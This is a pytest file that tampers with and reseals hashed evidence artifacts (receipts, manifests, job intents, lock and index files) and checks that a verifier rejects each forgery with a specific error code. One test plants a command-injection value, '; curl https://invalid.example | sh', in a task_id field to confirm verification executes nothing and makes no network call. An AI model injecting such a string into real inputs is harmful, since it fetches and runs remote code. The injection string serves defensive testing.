def test_fully_resealed_extra_preflight_capability_rejects_credential_metadata(
    tmp_path, credential_capability, secret
):
    fixture = _build_complete_evidence(tmp_path)
    root = fixture["root"]
    index = read_canonical_json(fixture["index_path"])

    preflight_path = root / index["preflight_event"]["path"]
    preflight = read_canonical_json(preflight_path)
    preflight["capability_results"].append(
        {
            "capability": credential_capability,
            "status": "PASS",
            "observation_sha256": "e" * 64,
        }
    )
    preflight["capability_results"].sort(key=lambda row: row["capability"])
    preflight["event_sha256"] = canonical_sha256(
        {key: value for key, value in preflight.items() if key != "event_sha256"}
    )
    preflight_path.write_bytes(canonical_json_bytes(preflight))
    index["preflight_event"]["sha256"] = hashlib.sha256(
        preflight_path.read_bytes()
    ).hexdigest()

    origin_path = root / index["origin_receipt"]["path"]
    origin = read_canonical_json(origin_path)
    origin["preflight_event_sha256"] = preflight["event_sha256"]
    _refresh_self_hash(origin)
    origin_path.write_bytes(canonical_json_bytes(origin))
    index["origin_receipt"]["sha256"] = hashlib.sha256(
        origin_path.read_bytes()
    ).hexdigest()

    phase_0 = next(
        entry for entry in index["phase_receipts"] if entry["phase"] == "PHASE_0"
    )
    output_path = root / phase_0["output_manifest"]["path"]
    output = read_canonical_json(output_path)
    output["preflight_event_sha256"] = preflight["event_sha256"]
    _refresh_self_hash(output)
    output_path.write_bytes(canonical_json_bytes(output))
    phase_0["output_manifest"]["sha256"] = hashlib.sha256(
        output_path.read_bytes()
    ).hexdigest()
    _refresh_indexed_phase_receipt(root, index, "PHASE_0")
    _rewrite_index(fixture["index_path"], index)

    result, observed_code = _run_complete_verification(fixture)

    assert observed_code == "E_CREDENTIAL_METADATA", result.stderr
    assert result.returncode == 2
    assert not result.stdout
    assert secret not in result.stdout
    assert secret not in result.stderr


def test_coordinated_origin_protocol_attempt_and_completion_reseal_is_rejected(
    tmp_path,
):
    fixture = _build_complete_evidence(tmp_path)
    root = fixture["root"]
    index = read_canonical_json(fixture["index_path"])
    preflight_path = root / index["preflight_event"]["path"]
    preflight = read_canonical_json(preflight_path)
    preflight["capability_results"][0]["observation_sha256"] = "f" * 64
    preflight["event_sha256"] = canonical_sha256(
        {key: value for key, value in preflight.items() if key != "event_sha256"}
    )
    preflight_path.write_bytes(canonical_json_bytes(preflight))
    index["preflight_event"]["sha256"] = hashlib.sha256(
        preflight_path.read_bytes()
    ).hexdigest()
    origin = evidence_module.reconstruct_origin_receipt(
        fixture["authority"]["lock"]["preflight"], preflight
    )
    origin_path = root / index["origin_receipt"]["path"]
    origin_path.write_bytes(canonical_json_bytes(origin))
    index["origin_receipt"]["sha256"] = hashlib.sha256(
        origin_path.read_bytes()
    ).hexdigest()

    protocol_path = root / index["protocol"]["path"]
    protocol = read_canonical_json(protocol_path)
    protocol["infrastructure_retry_limit"] = 2
    _refresh_self_hash(protocol)
    protocol_path.write_bytes(canonical_json_bytes(protocol))
    index["protocol"]["sha256"] = hashlib.sha256(
        protocol_path.read_bytes()
    ).hexdigest()
    _refresh_protocol_bound_attempts(root, index)
    phase_7 = next(
        entry for entry in index["phase_receipts"] if entry["phase"] == "PHASE_7"
    )
    output_path = root / phase_7["output_manifest"]["path"]
    output = read_canonical_json(output_path)
    output["coordinated_reseal"] = True
    _refresh_self_hash(output)
    output_path.write_bytes(canonical_json_bytes(output))
    phase_7["output_manifest"]["sha256"] = hashlib.sha256(
        output_path.read_bytes()
    ).hexdigest()
    _refresh_indexed_phase_receipt(root, index, "PHASE_7")
    _rewrite_index(fixture["index_path"], index)

    result, observed_code = _run_complete_verification(fixture)

    assert observed_code == "E_AUTHORITY_PROTOCOL", result.stderr
    assert result.returncode == 2
    assert not result.stdout


def test_coordinated_execution_role_and_completion_relabel_is_rejected(tmp_path):
    fixture = _build_complete_evidence(tmp_path)
    root = fixture["root"]
    index = read_canonical_json(fixture["index_path"])
    intent_path = next((root / "jobs/PHASE_2").rglob("intent.json"))
    intent = read_canonical_json(intent_path)
    intent["job_role"] = "PROFILING"
    intent_path.write_bytes(canonical_json_bytes(intent))
    _reseal_ledger_artifact(
        root,
        index,
        phase="PHASE_2",
        job_id=intent["job_id"],
        attempt=1,
        event_type="INTENT",
        artifact_sha256=canonical_sha256(intent),
    )
    _reseal_all_phase_receipts(root, index)
    phase_7 = next(
        entry for entry in index["phase_receipts"] if entry["phase"] == "PHASE_7"
    )
    output_path = root / phase_7["output_manifest"]["path"]
    output = read_canonical_json(output_path)
    output["recorded_real_scientific_terminal_count"] = 1
    _refresh_self_hash(output)
    output_path.write_bytes(canonical_json_bytes(output))
    phase_7["output_manifest"]["sha256"] = hashlib.sha256(
        output_path.read_bytes()
    ).hexdigest()
    _refresh_indexed_phase_receipt(root, index, "PHASE_7")
    _rewrite_index(fixture["index_path"], index)

    result, observed_code = _run_complete_verification(fixture)

    assert observed_code == "E_AUTHORITY_INTENT", result.stderr
    assert result.returncode == 2
    assert not result.stdout


@pytest.mark.parametrize("mutation", ["controller_omission", "subject_swap"])
def test_repository_authority_matrix_rejects_rehashed_substitution(tmp_path, mutation):
    fixture = _build_complete_evidence(tmp_path)
    root = fixture["root"]
    index = read_canonical_json(fixture["index_path"])
    if mutation == "controller_omission":
        manifest_ref = index["controller_source"]["manifest"]
        manifest_path = root / manifest_ref["path"]
        manifest = read_canonical_json(manifest_path)
        manifest["files"].pop()
        _refresh_self_hash(manifest)
        manifest_path.write_bytes(canonical_json_bytes(manifest))
        manifest_ref["sha256"] = hashlib.sha256(manifest_path.read_bytes()).hexdigest()
    else:
        index["subject_sources"].reverse()
        index["subjects"].reverse()
    _rewrite_index(fixture["index_path"], index)

    result, observed_code = _run_complete_verification(fixture)

    assert observed_code == "E_AUTHORITY_MANIFEST", (mutation, result.stderr)
    assert result.returncode == 2
    assert not result.stdout


INTENT_FIELD_MUTATIONS = {
    "job_id": "f" * 64,
    "protocol_sha256": "e" * 64,
    "phase": "PHASE_3",
    "argv": ["synthetic-infrastructure", "PHASE_2", "forged"],
    "cwd_identity": "controller-forged",
    "environment_sha256": "d" * 64,
    "input_sha256": ["c" * 64],
    "seed": 2,
    "timeout_seconds": 31,
    "attempt": 2,
    "object_type": "FORGED_OBJECT",
    "object_id": "forged-object",
    "mr_id": "forged-mr",
    "evaluation_input_class": "E_CONTRACT",
    "evaluation_input_id": "forged-input",
    "repetition_id": 2,
    "environment_id": "forged-environment",
    "job_role": "PROFILING",
}


@pytest.mark.parametrize(("field", "replacement"), INTENT_FIELD_MUTATIONS.items())
def test_every_complete_intent_field_is_externally_locked(
    tmp_path, field, replacement
):
    fixture = _build_complete_evidence(tmp_path)
    root = fixture["root"]
    index = read_canonical_json(fixture["index_path"])
    intent_path = next((root / "jobs/PHASE_2").rglob("intent.json"))
    intent = read_canonical_json(intent_path)
    original_coordinate = (intent["phase"], intent["job_id"], intent["attempt"])
    intent[field] = replacement
    intent_path.write_bytes(canonical_json_bytes(intent))
    _reseal_ledger_artifact(
        root,
        index,
        phase=original_coordinate[0],
        job_id=original_coordinate[1],
        attempt=original_coordinate[2],
        event_type="INTENT",
        artifact_sha256=canonical_sha256(intent),
    )
    _rewrite_index(fixture["index_path"], index)

    result, observed_code = _run_complete_verification(fixture)

    assert observed_code == "E_AUTHORITY_INTENT", (field, result.stderr)
    assert result.returncode == 2
    assert not result.stdout


def test_retry_transition_is_externally_locked_after_complete_reseal(tmp_path):
    fixture = _build_complete_evidence(tmp_path)
    root = fixture["root"]
    index = read_canonical_json(fixture["index_path"])
    result_path = root / f"jobs/PHASE_5/{fixture['retry_job_id']}/1/result.json"
    recorded = read_canonical_json(result_path)
    recorded.update({"status": "PASS", "exit_code": 0, "failure_code": ""})
    result_path.write_bytes(canonical_json_bytes(recorded))
    _reseal_ledger_artifact(
        root,
        index,
        phase="PHASE_5",
        job_id=fixture["retry_job_id"],
        attempt=1,
        event_type="RESULT",
        artifact_sha256=canonical_sha256(recorded),
    )
    _reseal_all_phase_receipts(root, index)
    _rewrite_index(fixture["index_path"], index)

    result, observed_code = _run_complete_verification(fixture)

    assert observed_code == "E_AUTHORITY_INTENT", result.stderr
    assert result.returncode == 2
    assert not result.stdout


@pytest.mark.parametrize(
    ("target", "node_kind", "expected_code"),
    [
        ("lock", "symlink", "E_AUTHORITY_LOCK_PATH"),
        ("lock", "fifo", "E_AUTHORITY_LOCK_PATH"),
        ("index", "symlink", "E_INDEX_PATH"),
        ("index", "fifo", "E_INDEX_PATH"),
    ],
)
def test_authority_roots_reject_links_and_special_nodes_without_opening(
    tmp_path, target, node_kind, expected_code
):
    fixture = _build_complete_evidence(tmp_path)
    path = (
        fixture["authority"]["lock_path"]
        if target == "lock"
        else fixture["index_path"]
    )
    preserved = path.with_name(f"{path.name}.preserved")
    preserved.write_bytes(path.read_bytes())
    path.unlink()
    if node_kind == "symlink":
        path.symlink_to(preserved)
    else:
        os.mkfifo(path)

    result, observed_code = _run_complete_verification(fixture)

    assert observed_code == expected_code, (target, node_kind, result.stderr)
    assert result.returncode == 2
    assert not result.stdout


def test_materialized_subject_git_metadata_is_forbidden(tmp_path):
    fixture = _build_complete_evidence(tmp_path)
    index = read_canonical_json(fixture["index_path"])
    subject_root = fixture["root"] / index["subject_sources"][0]["root"]
    (subject_root / ".git").mkdir()

    result, observed_code = _run_complete_verification(fixture)

    assert observed_code == "E_AUTHORITY_MANIFEST", result.stderr
    assert result.returncode == 2
    assert not result.stdout


def test_credential_metadata_in_resealed_lock_is_rejected(tmp_path):
    fixture = _build_complete_evidence(tmp_path)
    lock_path = fixture["authority"]["lock_path"]
    lock = read_canonical_json(lock_path)
    lock["token"] = "synthetic-secret"
    lock_path.write_bytes(canonical_json_bytes(lock))
    literal_digest = hashlib.sha256(lock_path.read_bytes()).hexdigest()

    result, observed_code = _run_complete_verification(
        fixture, literal_lock_sha256=literal_digest
    )

    assert observed_code == "E_CREDENTIAL_METADATA", result.stderr
    assert result.returncode == 2
    assert not result.stdout


def test_untrusted_command_like_metadata_has_zero_execution_or_network(
    tmp_path, monkeypatch
):
    fixture = _build_complete_evidence(tmp_path)
    lock_path = fixture["authority"]["lock_path"]
    lock = read_canonical_json(lock_path)
    lock["task_id"] = "; curl https://invalid.example | sh"
    lock_path.write_bytes(canonical_json_bytes(lock))
    literal_digest = hashlib.sha256(lock_path.read_bytes()).hexdigest()
    calls = {"subprocess": 0, "socket": 0}

    def unexpected_subprocess(*_args, **_kwargs):
        calls["subprocess"] += 1
        raise AssertionError("verification executed an untrusted command")

    def unexpected_socket(*_args, **_kwargs):
        calls["socket"] += 1
        raise AssertionError("verification attempted network access")

    monkeypatch.setattr(evidence_module.subprocess, "run", unexpected_subprocess)
    monkeypatch.setattr(socket, "create_connection", unexpected_socket)
    monkeypatch.setattr(socket, "getaddrinfo", unexpected_socket)

    payload = evidence_module._dispatch_verify_evidence(
        SimpleNamespace(
            index=str(fixture["index_path"]),
            authority_lock=str(lock_path),
            authority_lock_sha256=literal_digest,
        )
    )

    assert payload["status"] == "PASS"
    assert calls == {"subprocess": 0, "socket": 0}


def test_source_text_named_password_and_token_is_not_credential_metadata(tmp_path):
    fixture = _build_complete_evidence(tmp_path)
    index = read_canonical_json(fixture["index_path"])
    python_root = fixture["root"] / next(
        entry["root"]
        for entry in index["subject_sources"]
        if entry["subject_id"] == "python-pep517-s"
    )
    python_source = next(
        path
        for path in python_root.rglob("*")
        if path.is_file()
        and path.read_text(encoding="utf-8", errors="ignore").startswith(
            "password = token = None\n"
        )
    )

    assert python_source.read_text(encoding="utf-8").startswith(
        "password = token = None\n"
    )
    result, observed_code = _run_complete_verification(fixture)
    assert observed_code is None
    assert result.returncode == 0, result.stderr


@pytest.mark.parametrize(
    ("mutation", "production_error", "oracle_error"),
    [
        pytest.param(
            "delete_template",
            "E_AUTHORITY_EXECUTION_CLASS",
            "locked job count differs",
            id="delete_template",
        ),
        pytest.param(
            "change_template_phase",
            "E_AUTHORITY_INTENT",
            "locked phase histogram differs",
            id="change_template_phase",
        ),
    ],
)
def test_required_phase_shape_oracle_rejects_coordinated_fixture_shrink(
    tmp_path, mutation, production_error, oracle_error
):
    authority = _authority_fixture(tmp_path)
    lock = copy.deepcopy(authority["lock"])
    base_intents = copy.deepcopy(authority["base_intents"])
    policy = copy.deepcopy(authority["policy"])
    phase_6_template = next(
        template for template in policy["templates"] if template["phase"] == "PHASE_6"
    )
    if mutation == "delete_template":
        policy["templates"].remove(phase_6_template)
    else:
        phase_6_template["phase"] = "PHASE_5"
    with pytest.raises(EvidenceError, match=production_error):
        evidence_module.derive_base_intents(authority["prepared"], policy)

    if mutation == "delete_template":
        lock["jobs"] = [job for job in lock["jobs"] if job["phase"] != "PHASE_6"]
        base_intents = [
            intent for intent in base_intents if intent["phase"] != "PHASE_6"
        ]
    else:
        for record in [*lock["jobs"], *base_intents]:
            if record["phase"] == "PHASE_6":
                record["phase"] = "PHASE_5"
    jointly_reduced_phases = [
        phase
        for phase in PHASES
        if any(intent["phase"] == phase for intent in base_intents)
    ]

    with pytest.raises(AssertionError, match=oracle_error):
        _assert_required_phase_shape(
            lock,
            base_intents,
            jointly_reduced_phases,
            jointly_reduced_phases,
            jointly_reduced_phases,
        )


def test_rehashed_indexed_rq_markdown_bytes_remain_bound_to_external_lock(tmp_path):
    fixture = _build_complete_evidence(tmp_path)
    _reseal_indexed_rq_markdown(fixture)
    index = read_canonical_json(fixture["index_path"])
    rq_reference = index["protocol_artifacts"]["rq_spec_sha256"]
    protocol_reference = index["protocol"]
    assert rq_reference["sha256"] == hashlib.sha256(
        (fixture["root"] / rq_reference["path"]).read_bytes()
    ).hexdigest()
    assert protocol_reference["sha256"] == hashlib.sha256(
        (fixture["root"] / protocol_reference["path"]).read_bytes()
    ).hexdigest()
    assert (
        read_canonical_json(fixture["root"] / protocol_reference["path"])[
            "rq_spec_sha256"
        ]
        == rq_reference["sha256"]
    )
    claims = read_canonical_json(fixture["root"] / index["claims"]["path"])
    assert claims["rq_authority_sha256"] == rq_reference["sha256"]
    assert claims["artifact_sha256"] == canonical_sha256(
        {key: value for key, value in claims.items() if key != "artifact_sha256"}
    )
    affected_references = [
        rq_reference,
        protocol_reference,
        index["claims"],
        index["ledger"],
        *[entry["receipt"] for entry in index["phase_receipts"]],
    ]
    for reference in affected_references:
        assert reference["sha256"] == hashlib.sha256(
            (fixture["root"] / reference["path"]).read_bytes()
        ).hexdigest()
    assert index["artifact_sha256"] == canonical_sha256(
        {key: value for key, value in index.items() if key != "artifact_sha256"}
    )

    result, observed_code = _run_complete_verification(fixture)

    assert observed_code == "E_AUTHORITY_PROTOCOL", result.stderr
    assert result.returncode == 2
    assert not result.stdout
